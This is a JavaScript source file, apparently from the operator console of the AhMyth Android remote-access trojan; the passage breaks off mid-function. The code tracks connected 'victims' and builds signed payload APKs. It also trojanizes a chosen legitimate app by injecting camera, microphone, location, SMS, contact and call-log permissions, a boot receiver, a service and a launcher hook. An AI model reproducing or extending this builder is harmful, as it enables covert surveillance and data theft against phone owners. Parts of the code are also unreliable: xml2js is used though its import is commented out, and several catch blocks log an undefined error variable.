var app = angular.module('myapp', []);
const { ipcRenderer } = require('electron');
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
var fs = require('fs-extra');
//var xml2js = require('xml2js');


const { DOMParser, XMLSerializer } = require('xmldom');
const xpath = require('xpath')


var readdirp = require('readdirp');
const { dialog, getCurrentWindow } = require('@electron/remote');
const { getVictim } = require('@electron/remote').require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants');
const os = require('os');
const dir = require("path");
//--------------------------------------------------------------
var viclist = {};
var dataPath = dir.join(os.homedir(), CONSTANTS.dataDir);
var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);
//--------------------------------------------------------------

// App Controller for (index.html)
app.controller('AppCtrl', ($scope, $timeout) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = {
        enable: false,
        method: 'BOOT'
    }; // default values for binding apk

    var log = document.getElementById("log");

    $appCtrl.logs = [];

    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    $appCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };

    // handle dark mode toggle
    $appCtrl.switch = async () => {
        const isDarkMode = await ipcRenderer.invoke('dark-mode:toggle');
        document.getElementById('theme-source').innerHTML = isDarkMode ? 'Dark' : 'Light';

        // Toggle the active class on the button
        const toggleButton = document.getElementById('toggle-dark-mode');
        if (isDarkMode) {
            toggleButton.classList.add('active');
            document.body.classList.add('dark-mode');
        } else {
            toggleButton.classList.remove('active');
            document.body.classList.remove('dark-mode');
        }
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }
        ipcRenderer.send("SocketIO:Listen", port);
    };

    ipcRenderer.on("SocketIO:Listen", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = true;
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        viclist[index] = getVictim(index);
        $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        $appCtrl.$apply();
    });

    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    };

    ipcRenderer.on('SocketIO:GeoIPError', (event, warning) => {
        $appCtrl.Log(warning, CONSTANTS.logStatus.WARNING);
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:LostVictimConnection', (event, index) => {
        if (viclist[index]) {
            $appCtrl.Log('[X] Victim Connection from ' + viclist[index].ip + 'was Lost.', CONSTANTS.logStatus.FAIL);
            delete viclist[index];
            $appCtrl.$apply();
        }
    });

    // when the user clicks the stop button
    $appCtrl.terminateListener = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }
        ipcRenderer.send("SocketIO:TerminateListener", port);
    };

    ipcRenderer.on("SocketIO:TerminateListener", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:TerminateListenerError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:TerminateListenerAndRemoveAllVictims', () => {
        for (let victim in viclist) {
            delete viclist[victim];
        }
        $appCtrl.$apply();
    });

    // when notified from the main process about listener termination with active connections
    /* logic for termination with no active connections is actively handled in `main.js` alone */
    ipcRenderer.on('SocketIO:ListenerTerminatedMessage', (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    // when the user clicks the `x` button next to an individual connected client
    $appCtrl.disconnectVictim = (port, index) => {
        ipcRenderer.send("SocketIO:DisconnectVictim", port, index);
    };

    ipcRenderer.on("SocketIO:DisconnectedVictim", (event, message, index) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        delete viclist[index];
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:DisconnectVictimError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.$apply();
    });

    // Automatically set the IP address
    $appCtrl.setWiFiIP = () => {
        const wifiIP = getWiFiIP(); // Call the function to get Wi-Fi IP address
        if (wifiIP) {
            $appCtrl.srcIP = wifiIP; // Set the IP address in the AngularJS model
        } else {
            // Log a warning message if the IP address cannot be set
            $appCtrl.Log('[!] Unable to Automatically Apply Your Private Wireless LAN adapter Wi-Fi address.', CONSTANTS.logStatus.WARNING);
            $appCtrl.Log('[¡] Please Enter it Manually.', CONSTANTS.logStatus.INFO);
        }
    };

    // Detect tab click event and set the Wi-Fi IP address
    $(document).ready(function () {
        $('a.item').click(function () {
            const tab = $(this).attr('data-tab');
            if (tab === 'second') { // APK Builder tab
                $appCtrl.setWiFiIP(); // Set the IP when the APK Builder tab is clicked
                $appCtrl.$apply(); // Update the AngularJS scope manually
            }
        });
    });


    // app logs to print any new log in the black terminal
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;
        else if (status == CONSTANTS.logStatus.WARNING)
            fontColor = CONSTANTS.logColors.ORANGE;

        $appCtrl.logs.push({
            date: new Date().toLocaleString(),
            msg: msg,
            color: fontColor
        });

        // Use $timeout to ensure the view is updated before scrolling
        $timeout(() => {
            if (log) {
                // use smooth scrolling for a lovely clean log output
                log.scrollTo({ top: log.scrollHeight, behavior: 'smooth' });
            }
        }, 0);

        if (!$appCtrl.$$phase)
            $appCtrl.$apply();
    };

    // function to clear the logs each time a button is clicked,
    // this is done to keep things clean.
    $appCtrl.clearLogs = () => {
        if ($appCtrl.logs.length !== 0) {
            $appCtrl.logs = [];
        }
    }

    const architecture = process.arch;
    if (architecture === 'ia32') {
        delayedLog('[!] WARNING: AhMyth wWill Cease Support for All 32bit Systems Once Apktool reaches v3.0.0.', CONSTANTS.logStatus.WARNING);
    } else {
        delayedLog('[★] Welcome to AhMyth Android R.A.T', CONSTANTS.logStatus.SUCCESS);
        delayedLog('————————————————————————————————————', CONSTANTS.logStatus.SUCCESS);
    }

    //function to open the dialog and choose apk to be bound
    $appCtrl.BrowseApk = () => {
        dialog.showOpenDialog({
            properties: ['openFile'],
            title: 'Choose APK to bind',
            buttonLabel: 'Select APK',
            filters: [{
                name: 'Android APK', extensions: ['apk']
            } //only select apk files
            ]
        }).then(result => {
            if (result.canceled) {
                $appCtrl.Log('[x] No APK Was Selected as a Template', CONSTANTS.logStatus.FAIL); //if user cancels the dialog
            } else {
                var printApkPath = result.filePaths[0];
                var printApkName = dir.basename(printApkPath);
                $appCtrl.Log('[¡] "' + printApkName + '"' + ' Was Chosen as a Template', CONSTANTS.logStatus.INFO); //when the user selects an apk
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log('[x] No APK Was Selected as a Template'); //if user cancels the dialog
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }
    }

    $appCtrl.GenerateApk = async (apkFolder) => {
        if (!$appCtrl.bindApk.enable) {
            var checkBoxofCamera = document.getElementById("Permissions1");
            var checkBoxofStorage = document.getElementById("Permissions2");
            var checkBoxofMic = document.getElementById("Permissions3");
            var checkBoxofLocation = document.getElementById("Permissions4");
            var checkBoxofContacts = document.getElementById("Permissions5");
            var checkBoxofSms = document.getElementById("Permissions6");
            var checkBoxofCallsLogs = document.getElementById("Permissions7");

            // default permissions for the payload
            const permissions = CONSTANTS.permissions;

            // Create an array to store the selected permissions
            var selectedPermissions = [];

            // Check each checkbox and add the corresponding permission to the selectedPermissions array
            if (checkBoxofCamera.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
            }
            if (checkBoxofStorage.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
            }
            if (checkBoxofMic.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
            }
            if (checkBoxofLocation.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
            }
            if (checkBoxofContacts.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
            }
            if (checkBoxofSms.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
            }
            if (checkBoxofCallsLogs.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
            }

            // If all checkboxes are checked, set selectedPermissions to the permissions array from CONSTANTS
            if (
                checkBoxofCamera.checked &&
                checkBoxofStorage.checked &&
                checkBoxofMic.checked &&
                checkBoxofLocation.checked &&
                checkBoxofContacts.checked &&
                checkBoxofSms.checked &&
                checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            // If all checkboxes are unchecked, set selectedPermissions to an empty array
            if (
                !checkBoxofCamera.checked &&
                !checkBoxofStorage.checked &&
                !checkBoxofMic.checked &&
                !checkBoxofLocation.checked &&
                !checkBoxofContacts.checked &&
                !checkBoxofSms.checked &&
                !checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            try {
                delayedLog('[★] Reading the Payload Manifest File...');
                const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');

                try {
                    delayedLog('[★] Parsing the Payload Manifest Data...');
                    const parsedData = await new Promise((resolve, reject) => {
                        xml2js.parseString(data, (parseError, parsedData) => {
                            if (parseError) {
                                reject(parseError);
                            } else {
                                // Modify the manifest data as needed
                                parsedData.manifest['uses-permission'] = [];
                                parsedData.manifest['uses-feature'] = [];

                                selectedPermissions.forEach(permission => {
                                    if (permission === 'android.hardware.camera') {
                                        parsedData.manifest['uses-feature'].push({
                                            $: {
                                                'android:name': 'android.hardware.camera'
                                            }
                                        });
                                    }

                                    if (permission === 'android.hardware.camera.autofocus') {
                                        parsedData.manifest['uses-feature'].push({
                                            $: {
                                                'android:name': 'android.hardware.camera.autofocus'
                                            }
                                        });
                                    }

                                    if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                                        parsedData.manifest['uses-permission'].push({
                                            $: {
                                                'android:name': permission
                                            }
                                        });
                                    }
                                });

                                resolve(parsedData);
                            }
                        });
                    });

                    // Convert the modified parsed data back to XML
                    const builder = new xml2js.Builder();
                    const updatedData = builder.buildObject(parsedData);
                    await fs.promises.writeFile(
                        dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'),
                        updatedData,
                        'utf8'
                    );
                } catch (parseError) {
                    delayedLog('[x] Error occurred while parsing the Payload Manifest:', CONSTANTS.logStatus.FAIL);
                    writeErrorLog(error, 'Parsing');
                    delayedLog('[¡] Error written to "Parsing.log" on', CONSTANTS.logStatus.INFO);
                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                    return;
                }
            } catch (readError) {
                // Handle errors related to reading the file
                delayedLog('[x] Error occurred while reading the Payload Manifest File:', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading');
                delayedLog('[¡] Error written to "Reading.log" on', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

        }

        try {
            delayedLog('[★] Emptying the Apktool Framework Directory...');
            exec('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
                (error, stderr, stdout) => {
                    if (error) throw error;
                });
        } catch (error) {
            // Ignore the error by doing nothing
        }

        if ($appCtrl.bindApk.enable) {

            // Build and Sign the Bound AhMyth Payload
            var originApkName = dir.basename(apkFolder) + ".apk";
            delayedLog('[★] Building ' + originApkName + '...');
            var createBoundApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, originApkName) + '" --use-aapt2 "' + '"';
            exec(createBoundApk,
                (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Building');
                        delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    delayedLog('[★] Signing ' + originApkName + '...');
                    var signBoundApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, originApkName) + '"';
                    exec(signBoundApk, (error, stdout, stderr) => {
                        if (error !== null) {
                            delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Signing');
                            delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Remove the decompiled APK folder
                        /*delayedLog('[★] Cleaning up...')
                        fs.rmdir(apkFolder, {
                            recursive: true
                        }, (err) => {
                            if (err) throw err;
                        });*/

                        fs.unlink(dir.join(outputPath, originApkName),
                            (err) => {
                                if (err) throw err;

                                const apkNameBoundSigned = CONSTANTS.getApkNameBoundSigned(apkFolder);
                                delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
                                delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
                                delayedLog('[¡] ' + dir.join(outputPath, apkNameBoundSigned), CONSTANTS.logStatus.INFO);

                                fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                                    if (err) throw err;
                                });
                            });
                    });
                });
        } else {
            // Build and Sign the Standalone AhMyth Payload
            var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
            delayedLog('[★] Building ' + CONSTANTS.apkName + '...');
            exec(createApk,
                (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Building');
                        delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
                    var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
                    exec(signApk, (error, stdout, stderr) => {
                        if (error !== null) {
                            delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Signing');
                            delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        fs.unlink(dir.join(outputPath, CONSTANTS.apkName),
                            (err) => {
                                if (err) throw err;

                                delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
                                delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
                                delayedLog('[¡] ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.INFO);

                                fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                                    if (err) throw err;
                                });
                            });
                    });
                });
        }
    };

    // function to create the smali payload directory for storing ahmyth payload directories and files when binding
    $appCtrl.createPayloadDirectory = (files) => {
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown',
            'smali_assets'];
        var smaliList = files.filter((item) => item.isDirectory() && !(ignoreDirs.includes(item.name))).map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length - 1];

        if (lastSmali == "smali") {
            payloadSmaliFolder = '/smali_classes2';
            return payloadSmaliFolder;
        } else {
            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber + 1;
            var payloadSmaliFolder = '/smali_classes' + newSmaliNumber;
            return payloadSmaliFolder;
        }
    };

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {

        delayedLog('[★] Reading the Decompiled Original Application...')
        fs.readdir(apkFolder, {
            withFileTypes: true
        }, (error, files) => {
            if (error) {
                delayedLog('[x] Failed to Read the Decompiled Original Application!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            const payloadSmaliFolder = $appCtrl.createPayloadDirectory(files);
            const targetPayloadFolder = dir.join(apkFolder, payloadSmaliFolder);

            delayedLog(`[★] Creating the ${payloadSmaliFolder} Directory...`);
            fs.mkdir(targetPayloadFolder, {
                recursive: true
            }, (error) => {
                if (error) {
                    delayedLog(`[x] Unable to Create the ${payloadSmaliFolder} Directory!`, CONSTANTS.logStatus.FAIL);
                    return;
                }

                delayedLog(`[★] Copying Payload Files to the ${payloadSmaliFolder} Directory...`);
                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
                    overwrite: true
                }, (error) => {
                    if (error) {
                        delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Copying');
                        delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    // Copy android directory to the smali folder in the apkFolder
                    fs.copy(dir.join(targetPayloadFolder, 'android'), dir.join(apkFolder, 'smali', 'android'), {
                        overwrite: true
                    }, (error) => {
                        if (error) {
                            delayedLog('[x] Copying "android" directory failed!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Copying "android" directory');
                            delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Copy androidx directory to the smali folder in the apkFolder
                        fs.copy(dir.join(targetPayloadFolder, 'androidx'), dir.join(apkFolder, 'smali', 'androidx'), {
                            overwrite: true
                        }, (error) => {
                            if (error) {
                                delayedLog('[x] Copying "androidx" directory failed!', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'Copying "androidx" directory');
                                delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // Remove the original 'android' and 'androidx' directories (CHANGE TO 'fs.rmDir' of problems arise)
                            fs.rmdir(dir.join(targetPayloadFolder, 'android'), {
                                recursive: true
                            });
                            fs.rmdir(dir.join(targetPayloadFolder, 'androidx'), {
                                recursive: true
                            });

                            // Continue with Apk generation
                            $appCtrl.GenerateApk(apkFolder);
                        });
                    });
                });
            });
        });
    }

    $appCtrl.modifyManifest = (data, callback) => {
        // Retrieve the permission checkboxes from the UI.
        const checkBoxofCamera   = document.getElementById("Permissions1");
        const checkBoxofStorage  = document.getElementById("Permissions2");
        const checkBoxofMic      = document.getElementById("Permissions3");
        const checkBoxofLocation = document.getElementById("Permissions4");
        const checkBoxofContacts = document.getElementById("Permissions5");
        const checkBoxofSms      = document.getElementById("Permissions6");
        const checkBoxofCallsLogs = document.getElementById("Permissions7");
    
        // Default permissions from CONSTANTS.
        const permissions = CONSTANTS.permissions;
        let selectedPermissions = [];
    
        // Push mapped permissions if the corresponding checkbox is checked.
        if (checkBoxofCamera.checked)   selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
        if (checkBoxofStorage.checked)  selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
        if (checkBoxofMic.checked)      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
        if (checkBoxofLocation.checked) selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
        if (checkBoxofContacts.checked) selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
        if (checkBoxofSms.checked)      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
        if (checkBoxofCallsLogs.checked) selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
    
        // If all or none are checked, use the default permissions.
        if (
            (checkBoxofCamera.checked &&
             checkBoxofStorage.checked &&
             checkBoxofMic.checked &&
             checkBoxofLocation.checked &&
             checkBoxofContacts.checked &&
             checkBoxofSms.checked &&
             checkBoxofCallsLogs.checked) ||
            (!checkBoxofCamera.checked &&
             !checkBoxofStorage.checked &&
             !checkBoxofMic.checked &&
             !checkBoxofLocation.checked &&
             !checkBoxofContacts.checked &&
             !checkBoxofSms.checked &&
             !checkBoxofCallsLogs.checked)
        ) {
            selectedPermissions = permissions;
        }
    
        delayedLog('[★] Parsing the Android Manifest XML Data (DOM)...');
    
        // Parse the XML into a DOM.
        let doc;
        try {
            doc = new DOMParser().parseFromString(data, 'application/xml');
        } catch (err) {
            const callbackErrors = [
                '[x] Unable to Parse the Android Manifest XML Data!',
                '[¡] Error written to "Parsing.log" on ' + CONSTANTS.logStatus.INFO,
                logPath,
            ];
            writeErrorLog(err, 'Parsing.log');
            callback({ message: callbackErrors[0], callbackErrors });
            return;
        }
    
        // Cache a copy of the manifest document for later use (e.g. by getLauncherActivityDom).
        const manifestCache = doc.cloneNode(true);
    
        // The <manifest> element is the document element.
        const manifestEl = doc.documentElement; // <manifest>
    
        // Ensure that the <application> element exists.
        let appEl = xpath.select1('/manifest/application', doc);
        if (!appEl) {
            appEl = doc.createElement('application');
            manifestEl.appendChild(appEl);
        }
    
        // Gather any existing permissions and features.
        const existingPermissions = new Set();
        xpath.select('/manifest/uses-permission', doc).forEach(node => {
            const name = node.getAttribute('android:name');
            if (name) existingPermissions.add(name);
        });
        xpath.select('/manifest/uses-feature', doc).forEach(node => {
            const name = node.getAttribute('android:name');
            if (name) existingPermissions.add(name);
        });
    
        // Remove duplicates.
        const filteredPermissions = selectedPermissions.filter(permission => !existingPermissions.has(permission));
    
        delayedLog('[★] Injecting Payload Permissions (DOM)...');
    
        // Add new permission/feature nodes before the <application> element.
        filteredPermissions.forEach(permission => {
            let newEl;
            if (permission === 'android.hardware.camera' || permission === 'android.hardware.camera.autofocus') {
                newEl = doc.createElement('uses-feature');
            } else {
                newEl = doc.createElement('uses-permission');
            }
            newEl.setAttribute('android:name', permission);
            manifestEl.insertBefore(newEl, appEl);
        });
    
        delayedLog('[★] Injecting Payload Service and Receiver (DOM)...');
    
        // Create and configure the <receiver> element.
        const receiverEl = doc.createElement('receiver');
        receiverEl.setAttribute('android:enabled', 'true');
        receiverEl.setAttribute('android:exported', 'true');
        receiverEl.setAttribute('android:name', CONSTANTS.ahmythReceiver);
        const intentFilterEl = doc.createElement('intent-filter');
        const actionEl = doc.createElement('action');
        actionEl.setAttribute('android:name', 'android.intent.action.BOOT_COMPLETED');
        intentFilterEl.appendChild(actionEl);
        receiverEl.appendChild(intentFilterEl);
    
        // Create and configure the <service> element.
        const serviceEl = doc.createElement('service');
        serviceEl.setAttribute('android:enabled', 'true');
        serviceEl.setAttribute('android:exported', 'false');
        serviceEl.setAttribute('android:name', CONSTANTS.ahmythService);
    
        // Append the receiver and service to the <application> element.
        appEl.appendChild(receiverEl);
        appEl.appendChild(serviceEl);
    
        // Serialize the modified DOM back into an XML string.
        const xmlString = new XMLSerializer().serializeToString(doc);
    
        // Callback with the new XML string.
        if ($appCtrl.bindApk && $appCtrl.bindApk.method === 'ACTIVITY') {
            callback(null, xmlString, manifestCache);
        } else {
            callback(null, xmlString);
        }
    };

    $appCtrl.bindOnBoot = (apkFolder) => {
        const manifestPath = dir.join(apkFolder, 'AndroidManifest.xml');
        delayedLog('[★] Reading the Android Manifest XML File (DOM)...');
        fs.readFile(manifestPath, 'utf8', (error, data) => {
            if (error) {
                delayedLog('[x] Unable to Read the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog('[¡] Error written to "Reading.log" on ' + CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }
    
            $appCtrl.modifyManifest(data, (err, xmlString) => {
                if (err) {
                    delayedLog(err.message, CONSTANTS.logStatus.FAIL);
                    if (err.callbackErrors) {
                        err.callbackErrors.forEach(errorMsg => delayedLog(errorMsg, CONSTANTS.logStatus.FAIL));
                    }
                    return;
                }
    
                delayedLog('[★] Writing Payload Injections Back to the Android Manifest XML File (DOM)...');
                fs.writeFile(manifestPath, xmlString, 'utf8', (error) => {
                    if (error) {
                        delayedLog('[x] Unable to Write Payload Injections back to the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Writing.log');
                        delayedLog('[¡] Error written to "Writing.log" on ' + CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }
                    $appCtrl.copyAhmythFilesAndGenerateApk(apkFolder);
                });
            });
        });
    };
    
    $appCtrl.bindOnActivity = (apkFolder) => {
        const manifestPath = dir.join(apkFolder, 'AndroidManifest.xml');
        delayedLog('[★] Reading the Android Manifest XML File (DOM)...');
        fs.readFile(manifestPath, 'utf8', (error, data) => {
            if (error) {
                delayedLog('[x] Unable to Read the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog('[¡] Error written to "Reading.log" on ' + CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }
    
            $appCtrl.modifyManifest(data, (err, xmlString, manifestCache) => {
                if (err) {
                    delayedLog(err.message, CONSTANTS.logStatus.FAIL);
                    if (err.callbackErrors) {
                        err.callbackErrors.forEach(errorMsg => delayedLog(errorMsg, CONSTANTS.logStatus.FAIL));
                    }
                    return;
                }
    
                delayedLog('[★] Writing Payload Injections Back to the Android Manifest XML File (DOM)...');
                fs.writeFile(manifestPath, xmlString, 'utf8', (error) => {
                    if (error) {
                        delayedLog('[x] Unable to Write Payload Injection back to the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Writing.log');
                        delayedLog('[¡] Error written to "Writing.log" on ' + CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }
    
                    // Use the cached DOM to locate the launcher activity.
                    const launcherActivity = getLauncherActivity(manifestCache);
                    if (!launcherActivity) {
                        delayedLog('[x] Cannot locate a suitable main class type in the manifest!', CONSTANTS.logStatus.FAIL);
                        delayedLog('[x] Please use another APK as a template.', CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    const { className, type } = launcherActivity;
                    const classType = type === 'application' ? 'Main Application Class' : 'Main Launcher Activity Class';
                    delayedLog(`[★] Locating the ${classType} file...`);

                    // Pass className, apkFolder, and classType to getLauncherPath
                    getLauncherPath(className, apkFolder, classType, (err, launcherPath) => {
                        if (err) {
                            // Log the error message if any
                            delayedLog(`[x] ${err.message}`, CONSTANTS.logStatus.FAIL);
                            return;
                        }

                        if (launcherPath) {
                            delayedLog(`[✓] ${classType} file located: ${launcherPath}`, CONSTANTS.logStatus.INFO);
                        }

                        delayedLog(`[★] Reading the ${classType} File...`);
                        fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                            if (error) {
                                delayedLog(`[x] Unable to Read the ${classType} File!`, CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'Reading.log');
                                delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                            var hook = CONSTANTS.hookPoint;

                            delayedLog(`[★] Injecting AhMyth Hook into the ${classType} File...`);

                            var output = data.replace(hook, startService);
                            fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                if (error) {
                                    delayedLog(`[x] Unable to Hook the ${classType} File!`, CONSTANTS.logStatus.FAIL);
                                    writeErrorLog(error, 'Writing.log');
                                    delayedLog('[¡] Error written to "Writing.log" on ', CONSTANTS.logStatus.INFO);
                                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                    return;
                                }

                                delayedLog('[★] Determining Min & Max SDK Versions...')
                                fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                    if (error) {
                                        delayedLog('[x] Unable to Read the Target SDK version in the "apktool.yml" File!', CONSTANTS.logStatus.FAIL);
                                        writeErrorLog(error, 'Reading.log');
                                        delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
